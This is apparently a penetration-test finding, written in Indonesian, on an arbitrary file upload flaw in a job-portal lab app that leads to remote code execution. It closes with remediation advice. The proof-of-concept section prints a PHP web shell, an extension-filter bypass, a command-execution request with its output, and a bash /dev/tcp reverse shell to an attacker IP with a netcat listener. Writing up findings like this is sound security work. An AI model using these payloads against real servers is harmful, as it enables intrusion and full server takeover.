# Finding 04: Arbitrary File Upload to Remote Code Execution (RCE)

| Item | Detail |
|------|--------|
| **Kerentanan** | Arbitrary File Upload to Remote Code Execution (RCE) |
| **Severity** |  Critical |
| **Skor CVSS** | 9.8 (`CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N`) |
| **Endpoint** | `POST /api/resume/upload` → `/uploads/resume/shell.php` |

---

## Deskripsi

Terjadi ketika fitur pengunggahan file tidak memvalidasi jenis, ekstensi, atau isi file yang dikirim oleh pengguna secara ketat. Hal ini memungkinkan penyerang mengunggah file skrip eksekutabel (*web shell*) ke direktori web server yang dapat diakses publik.

---

## Dampak

- **Remote Code Execution (RCE):** Penyerang dapat mengeksekusi perintah sistem operasi (*command execution*) secara langsung dari jauh.
- **Pengambilalihan Server:** Penyerang dapat mengambil kontrol penuh atas server aplikasi, mengakses file internal, atau menggunakannya sebagai pijakan untuk menyerang jaringan lokal (*pivoting*).

---

## Langkah Proof of Concept (PoC)

### Langkah 1 — Melakukan upload file dengan ekstensi `.php`

Mencoba mengunggah file webshell `shell.php` secara langsung melalui fitur upload.

```http
POST /api/resume/upload HTTP/1.1
Host: jobportal.vulnapp.id
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/x-php

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary--
```

>  **[Capture Request Upload shell.php]**

---

### Langkah 2 — Bypass filter dengan upload file `.php.jpeg` dan me-rename nama file / request di Burp Suite

Jika ekstensi `.php` diblokir oleh validasi nama file di sisi client/server, file dinamai `shell.php.jpeg` agar lolos filter validasi gambar, lalu di-intercept via Burp Suite untuk mengganti ekstensi/header kembali menjadi `.php`.

```http
POST /api/resume/upload HTTP/1.1
Host: jobportal.vulnapp.id
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php.jpeg"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary--
```

>  **[Capture Intercept Burp Suite / Bypass Ekstensi shell.php.jpeg]**

---

### Langkah 3 — Akses `shell.php` untuk verifikasi eksekusi perintah (RCE)

Mengakses URL hasil upload file `shell.php` melalui browser/curl dengan menambahkan parameter perintah (`?cmd=id`).

**Request:**

```http
GET /uploads/resume/shell.php?cmd=id HTTP/1.1
Host: jobportal.vulnapp.id
```

**Response (Webshell Executed):**

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

>  **[Capture Hasil Akses Webshell & Output Command Execution]**

---

### Langkah 4 — Mendapatkan Reverse Shell (Listening & Connection)

Untuk mendapatkan akses terminal interaktif (RCE penuh):

1. **Siapkan listener di mesin attacker:**

```bash
nc -lvnp 4444
```

2. **Panggil payload reverse shell via webshell:**

```http
GET /uploads/resume/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.10.7/4444+0>%261' HTTP/1.1
Host: jobportal.vulnapp.id
```

3. **Koneksi reverse shell berhasil terhubung di terminal attacker:**

```text
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection accepted from target-ip:52134
www-data@target-server:/var/www/html/uploads/resume$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

>  **[Capture Netcat Listener & Reverse Shell Connected]**

---

## Rekomendasi Perbaikan

- Validasi file di sisi server (*server-side*) menggunakan **daftar putih (allowlist)** untuk ekstensi file dan MIME-type yang diizinkan.
- **Simpan file unggahan di luar direktori web root** atau gunakan penyimpanan pihak ketiga (*Cloud Object Storage*).
- **Randomize nama file** yang diunggah dan **matikan izin eksekusi skrip** (*disable execution permissions*) pada direktori penyimpanan.